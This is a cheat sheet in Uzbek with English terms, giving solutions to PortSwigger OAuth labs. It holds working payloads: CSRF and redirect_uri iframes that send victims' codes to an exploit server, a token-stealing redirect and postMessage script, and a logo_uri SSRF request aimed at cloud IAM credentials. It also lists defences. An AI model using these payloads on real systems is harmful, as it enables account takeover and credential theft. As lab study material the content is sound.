# OAuth — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, OAuth server = **oauth.example.net**, exploit server = **exploit.example.net**,
> Collaborator = **COLLAB.example.net**. Test user: `wiener:peter` (social: `peter.wiener:hotdog`).

### Auth bypass via implicit flow — APPRENTICE
Blog access token'ni `/authenticate` ga yuboradi, lekin email'ga ishonadi → email'ni carlos qil.
```
POST /authenticate → email=carlos@carlos-montoya.net
→ "Request in browser" → original session'da ochib carlos bo'lasan
```

### Forced OAuth profile linking (CSRF) — PRACTITIONER
Linking endpoint'da `state` yo'q → admin'ga o'z social code'ingni biriktirasan.
```html
<iframe src="https://example.com/oauth-linking?code=STOLEN-CODE"></iframe>
```
> Intercept qil → `GET /oauth-linking?code=...` ni DROP (code ishlatilmasin) → iframe'da deliver.

### Account hijacking via redirect_uri — PRACTITIONER
`redirect_uri` validatsiyasiz → admin code'ini exploit serverga oldirasan.
```html
<iframe src="https://oauth.example.net/auth?client_id=CLIENT_ID&redirect_uri=https://exploit.example.net&response_type=code&scope=openid%20profile%20email"></iframe>
```
> Access log'dan admin code → `https://example.com/oauth-callback?code=STOLEN`.

### Stealing tokens via open redirect — PRACTITIONER
`redirect_uri` ga `/../` traversal + ilovaning open-redirect'i (`/post/next?path=`).
```
redirect_uri=https://example.com/oauth-callback/../post/next?path=https://exploit.example.net
```
Exploit server scripti fragment'ni query'ga ko'chiradi:
```js
if(!document.location.hash){ location='https://oauth.example.net/auth?client_id=...&redirect_uri=...' }
else { location='/?'+document.location.hash.substr(1) }
```
> Token `GET /me` ga `Authorization: Bearer <token>` → admin API key.

### Stealing tokens via proxy page — PRACTITIONER
`redirect_uri` traversal → comment-form (iframe'dan `postMessage(..., '*')`). Exploit server:
```html
<iframe src="https://oauth.example.net/auth?client_id=CLIENT_ID&redirect_uri=https://example.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false)
</script>
```

### SSRF via OpenID dynamic client registration — EXPERT
`/reg` da auth'siz client registration → `logo_uri` SSRF.
```
POST /reg
{ "redirect_uris": ["https://example.com"], "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/" }
```
> Keyin `GET /client/CLIENT-ID/logo` → javobda IAM secret key.

---

### Eslatma
Doim tekshir: `redirect_uri` validatsiyasi, `state` (CSRF), implicit flow email trust, `jku/logo_uri`.
Chain: open redirect → OAuth token theft = ATO. Himoya: redirect_uri exact match, state majburlash.
Umumiy: bu papka README.
